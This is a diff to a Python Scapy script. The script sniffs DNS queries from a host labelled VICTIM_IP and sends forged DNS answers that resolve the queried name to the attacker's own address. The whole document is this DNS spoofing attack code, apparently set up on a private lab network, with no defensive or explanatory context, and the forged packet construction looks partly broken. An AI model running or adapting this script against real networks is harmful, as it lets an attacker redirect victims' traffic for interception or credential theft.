@@ -3,24 +3,30 @@
 from ntpath import join
 from socket import timeout
 from scapy.all import *
-from scapy.layers.inet import IP, UDP, TCP, ICMP
+from scapy.layers.inet import IP, UDP, TCP, ICMP 
 from scapy.layers.dns import *
 import sys
 
+THIS_IP = "192.168.50.128"
+VICTIM_IP = "192.168.50.129"
 
-packet_filt = " and ".join([
+#packet_filt = " and ".join([
 #"udp dst port 53", # dns port filtering
-"udp[10] & 0x80 = 0", # dns only
-"src host 192.168.59.3"]) # ip source	
+#"udp[10] & 0x80 = 0", # dns only
+#"src host 192.168.59.3"]) # ip source	
+
+packet_filter = f"udp port 53 and ip dst {THIS_IP} and ip src {VICTIM_IP}"
 
 
 def dns_reply(packet): 
-	print("sending packet")
-	send(IP(dst="192.168.59.5", src="192.168.59.3")/UDP(dport="53", sport="53")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))
+	print("received")
+	packet.show()
+	send(
+	IP(dst="192.168.50.129", src=THIS_IP)/
+	UDP(dport=packet[UDP].sport, sport=53)/
+	DNSRR(rrname=packet[DNS].name, rdata=THIS_IP))
 
+print(packet_filter)
 print("started sniffing")
-sniff(filter = packet_filt,prn = dns_reply, store=0, iface="enp0s10")
-
-
-
+sniff(filter = packet_filter,prn = dns_reply, store=0, iface="ens33")
 
